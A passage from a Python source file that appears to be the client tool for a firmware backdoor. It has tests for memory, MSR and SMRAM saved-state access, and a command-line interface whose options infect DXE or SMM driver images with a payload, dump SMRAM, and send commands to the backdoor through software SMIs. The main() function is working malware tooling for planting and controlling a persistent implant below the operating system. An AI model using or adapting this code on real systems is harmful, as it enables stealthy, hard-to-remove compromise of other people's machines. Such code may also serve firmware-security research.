        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


class TestVirtMemAccess(unittest.TestCase):

    def __init__(self, method):

        self.mem_size = PAGE_SIZE * 2

        # allocate test memory pages
        self.mem = mem_alloc(self.mem_size)
        self.mem.write('\0' * self.mem_size)

        init()

        super(TestVirtMemAccess, self).__init__(method)    

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        data = read_virt_mem(self.mem.addr, 0x20)

        write_virt_mem(self.mem.addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = 0x0102030405060708

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, val)

        assert read_virt_mem_1(addr) == val & 0xff
        assert read_virt_mem_2(addr) == val & 0xffff
        assert read_virt_mem_4(addr) == val & 0xffffffff
        assert read_virt_mem_8(addr) == val

        write_virt_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = int(time.time())

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 1, val)

        assert read_virt_mem_8(addr) == val << 8

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 2, val)

        assert read_virt_mem_8(addr) == val << 16

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 3, val)

        assert read_virt_mem_8(addr) == val << 24

        write_virt_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.mem.addr + PAGE_SIZE
        
        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


class TestSaveState(unittest.TestCase):

    def __init__(self, method):

        init()

        super(TestSaveState, self).__init__(method)

    def test_get(self):
        ''' Test saved state register get. '''

        global cs

        class TestChipsecWrapper(object):

            def __init__(self, cs):

                self.cs = cs

            def send_sw_smi(self, code, data, rax = 0, rbx = 0, rcx = 0, rdx = 0, rsi = 0, rdi = 0):

                self.cs.send_sw_smi(code, data, 
                                    rax = rax, rbx = rbx, rcx = rcx, 
                                    rdx = rdx, rsi = rsi, rdi = 0x1337)

        cs_old = cs

        # set up fake chipsec wrapper
        cs = TestChipsecWrapper(cs_old)

        # check RDI value read from saved state area
        assert state_get(SMM_SAVE_STATE_RDI) == 0x1337

        cs = cs_old

    def test_set(self):
        ''' Test saved state register set. '''

        state_set(SMM_SAVE_STATE_RDI, 0x1337)


class TestMsr(unittest.TestCase):

    IA32_APERF = 0xe8 # actual performance clock counter MSR

    def __init__(self, method):

        init()

        super(TestMsr, self).__init__(method)

    def test_get(self):
        ''' Test MSR read access. '''

        val_1 = msr_get(self.IA32_APERF)
        val_2 = msr_get(self.IA32_APERF)
        val_3 = msr_get(self.IA32_APERF)
        val_4 = msr_get(self.IA32_APERF)

        # check for the incrementing counter
        assert val_2 > val_1 and val_3 > val_2 and val_4 > val_3

    def test_set(self):
        ''' Test MSR write access. '''

        mask = (1 << 63)

        msr_set(self.IA32_APERF, 0)

        assert msr_get(self.IA32_APERF) & mask == 0

        msr_set(self.IA32_APERF, mask)

        assert msr_get(self.IA32_APERF) & mask == mask

        msr_set(self.IA32_APERF, 0)


class TestPhysAddr(unittest.TestCase):

    def __init__(self, method):

        self.mem_size = PAGE_SIZE
        self.mem_data = ''.join(map(lambda x: chr(x), range(0, 0xff)))

        # allocate test memory page
        self.mem = mem_alloc(self.mem_size)
        self.mem.write(self.mem_data)

        init()

        super(TestPhysAddr, self).__init__(method)

    def test(self):
        ''' Test virtual to physical address translation. '''

        phys_addr = get_phys_addr(self.mem.addr)

        assert self.mem_data == read_phys_mem(phys_addr, len(self.mem_data))


def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('-t', '--test', dest = 'test', action = 'store_true', default = False,
            help = 'test system for active infection'),

        make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
            help = 'dump SMRAM contents into the file'), 

        make_option('-s', '--size', dest = 'size', default = PAGE_SIZE,
            help = 'read size for --read-phys and --read-virt'),

        make_option('--read-phys', dest = 'read_phys', default = None,
            help = 'read physical memory page'),

        make_option('--read-virt', dest = 'read_virt', default = None,
            help = 'read virtual memory page'),        

        make_option('--read-state', dest = 'read_state', default = None,
            help = 'read SMRAM saved state area field'),        

        make_option('--debug', dest = 'debug_print', action = 'store_true', default = False,
            help = 'print backdoor debug information'),

        make_option('--debug-flush', dest = 'debug_flush', action = 'store_true', default = False,
            help = 'flush backdoor debug information buffer'),

        make_option('--use-timer', dest = 'use_timer', action = 'store_true', default = False,
            help = 'use periodic timer to communicate with the backdoor'),

        make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
            help = 'enable periodic timer SW SMI'),

        make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
            help = 'enable periodic timer SW SMI')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] Infector payload: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        # infect source file with specified payload
        infect(options.infect, options.payload, dst = options.output) 

        print('[+] DONE')

        return 0

    elif options.debug_print:

        init(use_timer = False)
        
        backdoor_debug_print()

        return 0

    elif options.debug_flush:

        init(use_timer = False)
        
        backdoor_debug_flush()

        return 0

    elif options.test:

        init(use_timer = options.use_timer)
        
        backdoor_test()

        return 0

    elif options.read_phys is not None:

        size = int(options.size, 16)
        addr = int(options.read_phys, 16)        

        init(use_timer = options.use_timer)
        
        print(hexdump(read_phys_mem(addr, size), addr = addr))

        return 0

    elif options.read_virt is not None:

        size = int(options.size, 16)
        addr = int(options.read_virt, 16)

        init(use_timer = options.use_timer)
        
        print(hexdump(read_virt_mem(addr, size), addr = addr))

        return 0

    elif options.read_state is not None:

        reg_name = 'SMM_SAVE_STATE_' + options.read_state.strip().upper()

        try:

            init(use_timer = options.use_timer)
            
            print('%s = 0x%.16x' % (reg_name, state_get(globals()[reg_name])))

            return 0

        except KeyError:

            print 'ERROR: Unknown SMRAM saved state register name'
            return -1

    elif options.timer_enable:

        init(use_timer = options.use_timer)

        timer_enable()

        return 0

    elif options.timer_disable:

        init(use_timer = options.use_timer)
        
        timer_disable()

        return 0

    elif options.dump_smram:

        init(use_timer = options.use_timer)
        
        smram_dump()

        return 0

    else:

        print('No actions specified, try --help')
        return -1    
    
if __name__ == '__main__':
    
    exit(main())

#
# EoF
#
